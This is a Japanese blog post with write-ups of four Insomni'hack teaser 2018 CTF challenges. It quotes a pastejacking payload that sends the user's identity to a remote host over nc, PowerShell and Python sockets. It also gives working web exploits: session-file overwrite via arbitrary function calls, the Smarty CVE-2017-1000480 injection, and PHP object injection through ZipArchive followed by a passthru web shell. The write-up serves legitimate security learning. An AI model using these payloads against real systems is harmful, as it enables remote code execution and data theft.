---
layout: post
title: Insomni'hack teaser 2018 の write-up
categories: [ctf]
date: 2018-01-22 14:00:00 +0900
---

チーム Harekaze で [Insomni'hack teaser 2018](http://teaser.insomnihack.ch/) に参加しました。最終的にチームで 429 点を獲得し、順位は得点 433 チーム中 33 位でした。うち、私は 3 問を解いて 179 点を入れました。

以下、解いた問題の write-up です。

## 競技時間内に解いた問題

### [warmup 37] welcome

`nc welcome.teaser.insomnihack.ch 42315` という問題文が与えられました。

コマンドラインにコピー&ペーストしてみると、[代わりに以下のような文字列が入力されました](https://github.com/dxa4481/Pastejacking)。

```
echo "$(whoami)@$(hostname)"|nc welcome.teaser.insomnihack.ch 42351
say you have been pwned
powershell -noprofile -command "$c=New-Object -TypeName System.Net.Sockets.TcpClient;$c.Connect('welcome.teaser.insomnihack.ch', 42351);$w=New-Object System.IO.StreamWriter($c.GetStream());$w.WriteLine(\"$(whoami)\")|Out-Null;$w.Close();$c.Close();"
exec("""from socket import *\nimport platform, getpass\ns=socket(AF_INET, SOCK_STREAM)\ns.connect(("welcome.teaser.insomnihack.ch",42351))\ns.sendall("{0}@{1}[{2}]".format(getpass.getuser(),platform.node(),platform.system()).encode("utf-8"))\ns.close()""")
clear||cls
nc welcome.teaser.insomnihack.ch 42513
```

横着せずに問題文を自分で入力して実行すると、フラグが得られました。

```
$ nc welcome.teaser.insomnihack.ch 42315
Welcome to the Insomni'hack Teaser 2018!

INS{YOU SHALL NOT PASTE}
```

```
INS{YOU SHALL NOT PASTE}
```

### [web 62] VulnShop

`phpinfo()` の結果と、以下のようなソースコードが与えられました。

```php
<?php if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
    error_reporting(0); session_start();  
    // Anti XSS filter 
    $_REQUEST = array_map("strip_tags", $_REQUEST); 
    // For later, when we will store infos about visitors. 
    chdir("tmp"); 
?> 
<!DOCTYPE html> 
<html> 
    <head> 
        <title>Work in progress...</title> 
        <meta charset="utf-8" /> 
        <meta http-equiv="content-type" content="text/html; charset=utf-8" /> 
        <style> 
            body { 
                background-color: #aaa; 
                color:#fff; 
            } 
             
            .page { 
                width: 50%; 
                margin: 0 auto; 
                margin-top: 75px; 
            } 
             
             
            .menu ul li { 
                display:inline-block; 
                vertical-align:top; 
                margin-right: 30px; 
                 
            } 
        </style> 
    </head> 
    <body> 
        <div class="page"> 
            <div class="menu"> 
                <ul> 
                    <li><a href="?page=default">Home</a></li> 
                    <li><a href="?page=introduction">Introduction</a></li> 
                    <li><a href="?page=privacy">Privacy</a></li> 
                    <li><a href="?page=contactus">Contact</a></li> 
                </ul> 
            </div> 
             
            <div class="content"> 
                <?php 
                        switch($_GET['page']) { 
                            case 'default': 
                            default: 
                                echo "<p>Welcome to our website about infosec. It's still under construction, but you can begin to browse some pages!</p>"; 
                                break; 
                            case 'introduction': 
                                echo "<p>Our website will introduce some new vulnerabilities. Let's check it out later!</p>"; 
                                break; 
                            case 'privacy': 
                                echo "<p>This website is unbreakable, so don't worry when contacting us about some new vulnerabilities!</p>"; 
                                break; 
                            case 'contactus': 
                                echo "<p>You can't contact us for the moment, but it will be available later.</p>"; 
                                $_SESSION['challenge'] = rand(100000,999999); 
                                break; 
                            case 'captcha': 
                                if(isset($_SESSION['challenge'])) echo $_SESSION['challenge']; 
                                // Will make an image later 
                touch($_SESSION['challenge']); 
                                break; 
                            case 'captcha-verify': 
                // verification functions take a file for later, when we'll provide more way of verification 
                                function verifyFromString($file, $response) { 
                                    if($_SESSION['challenge'] === $response) return true; 
                                    else return false; 
                                } 
                                 
                                // Captcha from math op 
                                function verifyFromMath($file, $response) { 
                                    if(eval("return ".$_SESSION['challenge']." ;") === $response) return true; 
                                    else return false; 
                                } 
                                if(isset($_REQUEST['answer']) && isset($_REQUEST['method']) && function_exists($_REQUEST['method'])){ 
                                    $_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']); 
                                } 
                                break; 

                        } 
                ?> 
            </div> 
        </div> 
        <p><a href="/?hl">View code source of the file, to be sure we're secure!</a></p> 
        <p><a href="/phpinfo.php">Show our configurations</a></p> 
    </body> 
</html> 
```

`?page=contactus` で `$_SESSION['challenge']` を初期化、`?page=captcha` で `$_SESSION['challenge']` というファイルを作成できるようです。

また、`?page=captcha-verify` で `$_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']);` という形で好きな関数を好きな引数 (ただし、第一引数は直接変更できない) で呼ぶことができるようです。これは作りかけのサイトですが、`$_SESSION['challenge']` に `123*456` のような式を入れて、`?page=captcha-verify&method=verifyFromMath&answer=56088` のようにして CAPTCHA として使う予定のようです。

さて、なんとかして第一引数を好きなものに変えられないか考えてみましょう。

`$_SESSION['challenge']` が変更されるのは `?page=contactus` の `$_SESSION['challenge'] = rand(100000,999999);` のみですが、なんとかしてこれ以外のものにできないでしょうか。

セッションを好きな内容に変更するには、`$_SESSION['key'] = value` のように PHP のコード中でいじる、セッションデータが格納されているファイルを直接いじるといった方法が考えられます。今回は後者の方法でやっていきましょう。

まず `?page=captcha-verify&method=file_put_contents&answer=challenge|s:4:"hoge";` にアクセスすると `./(100000 ~ 999999 の数値)` に `challenge|s:4:"hoge";` が書き込まれます。`phpinfo()` の結果からセッションデータは `/var/lib/php/sessions/` にあると分かっているので、`?page=captcha-verify&method=copy&answer=../../../../var/lib/php/sessions/sess_(セッション ID)` にアクセスしてセッションデータを書き換えます。

この後 `?page=captcha` にアクセスすると `hoge` と表示され、セッションデータが書き換えられたことが確認できました。

あとは `challenge|s:16:"../../../../flag";` をセッションデータとして書き込み、`?page=captcha-verify&method=readfile&answer=hoge` にアクセスするとフラグが得られました。

```
INS{4rb1tr4ry_func_c4ll_is_n0t_s0_fun}
```

### [web 80] Smart-Y

以下のようなソースコードが与えられました。

```php
<?php 

if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
include_once('./smarty/libs/Smarty.class.php'); 
define('SMARTY_COMPILE_DIR','/tmp/templates_c'); 
define('SMARTY_CACHE_DIR','/tmp/cache'); 
  
  
class news extends Smarty_Resource_Custom 
{ 
    protected function fetch($name,&$source,&$mtime) 
    { 
        $template = "The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>".htmlspecialchars("<<<DEBUG>>>")."</a>"; 
        $source = $template; 
        $mtime = time(); 
    } 
} 
  
// Smarty configuration 
$smarty = new Smarty(); 
$my_security_policy = new Smarty_Security($smarty); 
$my_security_policy->php_functions = null; 
$my_security_policy->php_handling = Smarty::PHP_REMOVE; 
$my_security_policy->modifiers = array(); 
$smarty->enableSecurity($my_security_policy); 
$smarty->setCacheDir(SMARTY_CACHE_DIR); 
$smarty->setCompileDir(SMARTY_COMPILE_DIR); 


$smarty->registerResource('news',new news); 
$smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : ''));  
```

Smarty が使われているようです。

`/smarty` にアクセスしてみると、`README.md` や `LICENSE` のようなファイルの一覧が表示されました。`change_log.txt` というファイルをチェックすると、バージョンが `3.1.31` という 2016 年の 12 月にリリースされたものであることが分かりました。

[CVE Details](https://www.cvedetails.com) で調べてみると、このバージョンには [CVE-2017-1000480](https://www.cvedetails.com/cve/CVE-2017-1000480/) という脆弱性があることが分かりました。

[この脆弱性が修正されたコミット](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61)を見ると、テンプレート名の `*/` を `* /` に置換したり、英数字と `.` 以外は削除したりするように変更されています。

`libs/sysplugins/smarty_internal_runtime_codeframe.php` では、`hoge` が入力されると、以下のようなコメントを出力するというような処理を行っています。

```php
/* Smarty version 3.1.31, created on 2018-01-20 16:08:10
  from "hoge" */
```

脆弱なバージョンでは `*/` までそのまま出力されてしまうため、このコメントを閉じてしまえるようです。

`console.php?id=*/readfile('/flag');/*` にアクセスしてみるとフラグが得られました。

```
INS{why_being_so_smart-y}
```

## 競技時間内に解けなかった問題

### [web 201] File Vault

以下のようなソースコードが与えられました。

```php
<?php

include('secret.php');
error_reporting(0);

if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; }

$sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);

global $sandbox_dir;

class VaultFile {
    function upload($init_filename, $content) {
        global $sandbox_dir;
        $fileinfo = pathinfo($init_filename);
        $fileext = isset($fileinfo['extension']) ? ".".$fileinfo['extension'] : '.txt';
        file_put_contents($sandbox_dir.'/'.sha1($content).$fileext, $content);
        $this->fakename = $init_filename;        
        $this->realname = sha1($content).$fileext;
    }

    function open($fakename, $realname){
        global $sandbox_dir;
        $fp = fopen($sandbox_dir.'/'.$realname, 'r');
        $analysis = "The file named ".htmlspecialchars($fakename)." is located in folder $sandbox_dir/$realname. Here all the informations about this file : ".print_r(fstat($fp),true);
        return $analysis;
    }
}

function s_serialize($a, $secret) { $b = serialize($a); $b = str_replace("../","./",$b); return $b.hash_hmac('sha256', $b, $secret); };
function s_unserialize($a, $secret) { $hmac = substr($a, -64); if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret)) return unserialize(substr($a, 0, -64)); }
   
if(!is_dir($sandbox_dir)) mkdir($sandbox_dir);
if(!is_file($sandbox_dir.'/.htaccess')) file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
if(!isset($_GET['action'])) $_GET['action'] = 'home';
if(!isset($_COOKIE['files'])){
    setcookie('files', s_serialize([], $secret));
    $_COOKIE['files'] = s_serialize([], $secret);
}

switch($_GET['action']){
    case 'home':
    default:
        $content =  "<form method='post' action='index.php?action=upload' enctype='multipart/form-data'><input type='file' name='vault_file'><input type='submit'/></form>";
        $files = s_unserialize($_COOKIE['files'], $secret);
        if($files) {
            $content .= "<ul>";
            $i = 0;
            foreach($files as $file) {
                $content .= "<li><form method='POST' action='index.php?action=changename&i=".$i."'><input type='text' name='newname' value='".htmlspecialchars($file->fakename, ENT_QUOTES)."'><input type='submit' value='Click to edit name'></form><a href='index.php?action=open&i=".$i."' target='_blank'>Click to show file informations</a></li>";
                $i++;
            }
            $content .= "</ul>";
        }
        break;
    case 'upload':
        if($_SERVER['REQUEST_METHOD'] === "POST") {
            if(isset($_FILES['vault_file'])) {
                $vaultfile = new VaultFile;
                $vaultfile->upload($_FILES['vault_file']['name'], file_get_contents($_FILES['vault_file']['tmp_name']));
                $files = s_unserialize($_COOKIE['files'], $secret);
                $files[] = $vaultfile;
                setcookie('files', s_serialize($files, $secret));
                header("Location: index.php?action=home");
                exit;
            }
        }
        break;
    case 'changename':
        if($_SERVER['REQUEST_METHOD'] === "POST") {        
            $files = s_unserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']]) && isset($_POST['newname'])){
                $files[$_GET['i']]->fakename = $_POST['newname'];
            }
            setcookie('files', s_serialize($files, $secret));            
        }
        header("Location: index.php?action=home");
        exit;
    case 'open':
        $files = s_unserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']])){
            echo nl2br($files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname));
        }
        exit;
    case 'reset':
        setcookie('files', s_serialize([], $secret));
        $_COOKIE['files'] = s_serialize([], $secret);
        array_map('unlink', glob("$sandbox_dir/*"));
        header("Location: index.php?action=home");
        exit;
}

?>

<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background-color:#aaa;
        }
        input {
            display:block;
            margin:10px 0;
        }

        ul {
            display:block;
            border:2px solid #aaa;
        }

        li {
            list-style-type:none;
        }

        input[type="text"], input[type="submit"], form {
            display:inline-block;
            margin:5px 5px;
        }
    </style>
</head>
<body>
<div class="content">
<h2>File manager</h2>
<p>Upload a file that will be stored in your file vault.</p>
<?=isset($content)?$content:"" ?>
<p><a href="index.php?action=reset">Reset my vault</a></p>
<p><a href="index.php?hl">Get my source code</a></p>
<!--<p><a href="phpinfo.php">Debug info</a></p>-->
</div>
</body>
</html>
```

`?action=upload` からファイルのアップロード、`?action=changename` からアップロードしたファイルの形式上の名前 (`fakename`) の変更、`?action=open` からアップロードしたファイルの情報 (内容は含まれない) の取得、`?action=reset` からアップロードしたファイルの全削除が行えるようです。

ファイルはどんな拡張子でもアップロードできるようですが、同じディレクトリの `.htaccess` に `php_flag engine off` が書き込まれているために、`.php` のような拡張子にしても PHP のコードを実行することはできません。

なんとかしてこの `.htaccess` を書き換えられないでしょうか。

ファイルの管理部分を見ていきます。

アップロードされたファイルは、`VaultFile` というクラスのインスタンスの配列として `s_serialize` でシリアライズされて Cookie に格納されます。

以下のようにシリアライズ時に署名を行い、アンシリアライズ時にはその検証を行っているため、一見何もできないように思えます。

```php
function s_serialize($a, $secret) { $b = serialize($a); $b = str_replace("../","./",$b); return $b.hash_hmac('sha256', $b, $secret); };
function s_unserialize($a, $secret) { $hmac = substr($a, -64); if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret)) return unserialize(substr($a, 0, -64)); }
```

ですが、`s_serialize` では `serialize` に配列を投げた後に `../` を `./` に置換しているため、例えばファイルの `fakename` に `../` が含まれている場合、`a:1:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:3:"./";s:8:"realname";s:44:"4ae2d637c731a3998dbfb2332ed95c3cb4938f83.php";}}` (文字列の場合 `s:(文字列の長さ):(文字列)` のようにシリアライズされるが、`s:3:"./"` になっている) のように構造が壊れたままで署名が行われて出力されます。

これを利用すると、配列の次の要素までの、他のプロパティを示す部分まで `fakename` の文字列として扱わせることができ、頑張れば PHP Object Injection を成立させることができそうです。

以下の手順で、2 番目にアップロードされたファイルの `fakename` までの部分が文字列として扱われる Cookie を作成できました。

1. 適当なファイル (`1.php`、`2.php`) を 2 つアップロード
2. `1.php` を `../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.php` にリネーム

```
(生成された Cookie)
a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:343:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.php";s:8:"realname";s:44:"4ae2d637c731a3998dbfb2332ed95c3cb4938f83.php";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:5:"2.php";s:8:"realname";s:44:"4ae2d637c731a3998dbfb2332ed95c3cb4938f83.php";}}b7032d2c7a6e398af73060c633e8734cf4b86599ff028d963821a2c6d1b3b344
```

この手順を少しずついじっていきましょう。

手順 2 の前に `2.php` を `;s:8:"realname";s:9:".htaccess";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:1:"a` にリネームします。これで `?action=open&i=0` にアクセスすると、`.htaccess` の更新日時などの情報が得られました。

続いて、`VaultFile` のメソッドが呼ばれている箇所を調べていきます。

`upload` は `?action=upload` で `$vaultfile->upload($_FILES['vault_file']['name'], file_get_contents($_FILES['vault_file']['tmp_name']))` のようにして呼ばれています。第一引数は操作できますが、第二引数はダメそうです。

`open` は `?action=open` で `$files[$_GET['i']]->open($files[$_GET['i']]->fakename, $files[$_GET['i']]->realname)` のようにして呼ばれています。引数はどちらも好きなように変えられ、さらに呼ばれるタイミングも簡単に操作できます。これを利用していきましょう。

`VaultFile` の `open` は `fopen` と `fstat` でファイルの情報を得るだけで、その内容を得たり書き換えたりすることはできなさそうです。`open` というメソッドを持つ、`VaultFile` 以外のクラスを探してみましょう。

以下のコードをローカルで実行してみると、4 つ該当するクラスが見つかりました。

```php
<?php
foreach (get_declared_classes() as $c) {
  if (array_search('open', get_class_methods($c)) !== false) {
    echo $c . "\n";
  }
}
```

```
$ php find.php 
SessionHandler
XMLReader
ZipArchive
SQLite3
```

このうち [`ZipArchive::open`](http://php.net/manual/ja/ziparchive.open.php) はファイルの上書きができ、都合がよさそうです。第一引数に `sandbox/$sandbox_dir/.htaccess`、第二引数に `8` (`ZipArchive::OVERWRITE`) が入るようにしてみましょう。

1. 適当なファイル (`1.php`、`2.php`) を 2 つアップロード
2. `2.php` を `;s:8:"realname";s:0:"";}i:1;O:10:"ZipArchive":2:{s:8:"realname";i:8;s:8:"filename";s:67:"` にリネーム
3. `1.php` を `../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.php` にリネーム
4. `2.php` を `sandbox/$sandbox_dir/.htaccess` にリネーム
5. `?action=open&i=1` にアクセス

これで `.htaccess` が空のファイルになりました。

あとは `<?php passthru($_GET['cmd']);` という内容の PHP ファイルをアップロードして、`sandbox/$sandbox_dir/09498b08b610505823df6d0940db02b3685a77d7.php?cmd=cat+/flag` にアクセスするとフラグが得られました。

```
INS{gr4tz_f0r_y0ur_uns3ri4l1z1ng_tal3nts}
```

---

本番では `ZipArchive` を見つけたところで時間切れでした。くやしい。